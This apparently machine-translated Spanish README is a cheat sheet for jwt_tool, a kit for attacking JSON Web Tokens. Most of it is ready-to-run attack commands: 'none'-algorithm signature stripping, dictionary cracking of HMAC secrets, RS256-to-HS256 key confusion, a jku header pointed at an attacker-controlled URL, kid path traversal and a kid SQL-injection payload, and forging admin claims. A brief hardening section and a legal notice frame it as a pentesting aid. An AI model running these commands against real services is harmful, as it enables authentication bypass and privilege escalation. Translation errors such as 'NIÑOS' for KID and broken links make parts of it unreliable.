<!-- language-home-navigation -->
[🏠 Página Principal Española](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🪙 jwt_tool - Hoja de referencia completa

[🇹🇷 Türkçe Sürüm](traducciones/README.tr.md)
```
       ██╗██╗    ██╗████████╗    ████████╗ ██████╗  ██████╗ ██╗     
       ██║██║    ██║╚══██╔══╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
       ██║██║ █╗ ██║   ██║          ██║   ██║   ██║██║   ██║██║     
  ██   ██║██║███╗██║   ██║          ██║   ██║   ██║██║   ██║██║     
  ╚█████╔╝╚███╔███╔╝   ██║          ██║   ╚██████╔╝╚██████╔╝███████╗
   ╚════╝  ╚══╝╚══╝    ╚═╝          ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
        All-in-One JSON Web Token Manipulation & Exploitation Suite
```
<p align="centro">
  <img src="https://img.shields.io/badge/jwt__tool-Token_Exploitation-blue?style=for-the-badge" alt="jwt_tool">
  <img src="https://img.shields.io/badge/Author-ticarpi-orange?style=for-the-badge" alt="ticarpi">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="Seguridad web">
  <img src="https://img.shields.io/badge/License-GPLv3-purple?style=for-the-badge" alt="GPLv3">
</p>

<p align="centro">
  <b>🪙 Potente kit de herramientas Python CLI para analizar, manipular, falsificar, escanear y descifrar tokens web JSON (JWT)</b>
</p>

---

## 📋 Tabla de contenidos

- [Descripción general y anatomía de JWT] (#-descripción general--jwt-anatomía)
- [Instalación](#-instalación)
- [Análisis e inspección de tokens] (#-análisis-token--inspección)
- [Escaneo automatizado de vulnerabilidades (`-M at`)](#-escaneo-automatizado-de-vulnerabilidad--m-at)
- [Escenarios de explotación comunes](#-escenarios-de-explotación-comunes)
  - [Confusión de algoritmo / Ninguno ataque (`none`)](#algoritmo-confusión--ninguno-ataque-ninguno)
  - [Descifrado de clave secreta HMAC] (#hmac-secret-key-cracking)
  - [Confusión de claves: RS256 a HS256 con clave pública](#key-confusion-rs256-to-hs256-with-public-key)
  - [Inyección de encabezado: JKU, X5U y JWK Spoofing](#header-injection-jku-x5u--jwk-spoofing)
  - [Inyección KID (SQLi y recorrido de ruta)](#kid-injection-sqli--path-traversal)
- [Reclamaciones por manipulación y falsificación de carga útil] (#-manipulación-de-carga útil--reclamaciones-por falsificación)
- [Tabla de referencia rápida](#-tabla-de-referencia-rápida)
- [Consideraciones defensivas y endurecimiento](#-consideraciones-defensivas--endurecimiento)
- [Aviso legal](#-aviso-legal)

---

## 🎯 Descripción general y anatomía de JWT

Un token web JSON (RFC 7519) consta de tres segmentos codificados en Base64URL separados por puntos (`.`):
`header.payload.signature`

1. **Encabezado:** Identifica el tipo de token (`typ`) y el algoritmo de firma (`alg`, por ejemplo, `HS256`, `RS256`, `none`).
2. **Carga útil:** Contiene reclamaciones de usuarios (`sub`, `role`, `admin`, `exp`).
3. **Firma:** Hash de verificación criptográfica que evita la manipulación del lado del cliente.

Creado por **ticarpi**, **jwt_tool** automatiza las pruebas de fallas arquitectónicas y de implementación en los flujos de trabajo de autenticación JWT en API y aplicaciones web modernas.

---

## 📥 Instalación
```bash
# Clone the repository
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool

# Install dependencies
pip install -r requirements.txt

# Run jwt_tool
python3 jwt_tool.py --help
```
---

## 🔍 Análisis e inspección de tokens

Decodifica e inspecciona los parámetros del encabezado y las reclamaciones de carga útil:
```bash
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOmZhbHNlfQ.signature
```
---

## ⚡ Escaneo automatizado de vulnerabilidades (`-M at`)

Inicie análisis automatizados del libro de jugadas que prueben las vulnerabilidades conocidas en un servicio web de destino:
```bash
# Run All Tests (-M at) sending requests to web endpoint
python3 jwt_tool.py <JWT_TOKEN> \
  -M at \
  -u "https://api.target.com/user/profile" \
  -rh "Authorization: Bearer <JWT_TOKEN>"
```
*Pruebas ejecutadas:*
- Eliminación de firma (ninguna variante de algoritmo)
- Confusión de claves de RSA a HMAC
- Manipulación de reclamos (`admin=true`, escalada de privilegios)
- Inyección en cabezales `kid`, `jku`, `x5u`
- Manejo de firmas vacías

---

## 💥 Escenarios comunes de explotación

### Confusión de algoritmo/ningún ataque (`none`)
Cuando las implementaciones de backend aceptan tokens sin firmar:
```bash
# Forge token with 'none' algorithm and stripped signature
python3 jwt_tool.py <JWT_TOKEN> -X a
```
*Variantes probadas automáticamente:* `none`, `None`, `NONE`, `nOnE`.

### Desciframiento de claves secretas de HMAC
Cuando HS256/HS384/HS512 utiliza una frase de contraseña débil:
```bash
# Dictionary attack using rockyou.txt
python3 jwt_tool.py <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt
```
### Confusión de claves: RS256 a HS256 con clave pública
Si el servidor firma con RSA (RS256) pero acepta HMAC (HS256) usando su certificado público como clave HMAC compartida:
```bash
# Forge token using server public key file
python3 jwt_tool.py <JWT_TOKEN> -X k -pk public.pem
```
### Inyección de encabezado: suplantación de JKU, X5U y JWK
Inyectar claves o URL controladas por un atacante:
```bash
# Inject attacker-controlled JWKS URL in jku header
python3 jwt_tool.py <JWT_TOKEN> -I -hc jku -hv "https://attacker.com/jwks.json" -S hs256 -k secret
```
### Inyección KID (SQLi y recorrido de ruta)
Si el backend utiliza el parámetro de encabezado `kid` (ID de clave) directamente en consultas de bases de datos o rutas de archivos:
```bash
# Path traversal pointing to /dev/null (empty secret)
python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "/dev/null" -S hs256 -p ""

# SQL Injection in kid header to bypass signature verification
python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "key1' UNION SELECT 'my_secret'--" -S hs256 -p "my_secret"
```
---

## ✍️ Reclamaciones por manipulación y falsificación de carga útil

Modifique valores de reclamo específicos y renueve el token:
```bash
# Change claim 'admin' to true and 'role' to 'SuperAdmin' using known secret
python3 jwt_tool.py <JWT_TOKEN> \
  -T \
  -pc "admin" -pv "true" \
  -pc "role" -pv "SuperAdmin" \
  -k "secret_key"
```
---

## ⚡ Tabla de referencia rápida

| Objetivo | Comando |
|-----------|------------------|
| **Decodificar y analizar token** | `python3 jwt_tool.py <JWT>` |
| **Escaneo de libros de estrategias todo en uno** | `python3 jwt_tool.py <JWT> -M at -u <URL> -rh "Auth: Bearer <JWT>"` |
| **Descifrar el secreto de HMAC** | `python3 jwt_tool.py <JWT> -C -d rockyou.txt` |
| **Omitir sin algoritmo** | `python3 jwt_tool.py <JWT> -X a` |
| **RS256 -> HS256 Confusión** | `python3 jwt_tool.py <JWT> -X k -pk public.pem` |
| **Carga útil y firma de manipulación** | `python3 jwt_tool.py <JWT> -T -pc admin -pv true -k <KEY>` |
| **Recorrido del camino para NIÑOS** | `python3 jwt_tool.py <JWT> -I -hc kid -hv "/dev/null" -S hs256 -p ""` |

---

## 🛡️ Consideraciones defensivas y endurecimiento

1. **Lista blanca estricta de algoritmos:** Nunca acepte `none` ni el cambio de algoritmo. Verifique explícitamente los algoritmos esperados (solo `RS256`).
2. **Rechazar claves controladas por el cliente:** No confíe ciegamente en los encabezados `jku`, `jwk` o `x5u` de entradas que no sean de confianza sin listas estrictas de dominios permitidos.
3. **Utilice secretos sólidos:** Asegúrese de que las claves HMAC tengan al menos 256 bits de bytes aleatorios criptográficos de alta entropía.

---

## ⚠️ Aviso legal

> [!PRECAUCIÓN]
> jwt_tool está diseñado estrictamente para pruebas de penetración autorizadas, evaluaciones de vulnerabilidad de API e investigaciones educativas. Falsificar tokens para acceder a sistemas no autorizados sin permiso por escrito es estrictamente ilegal.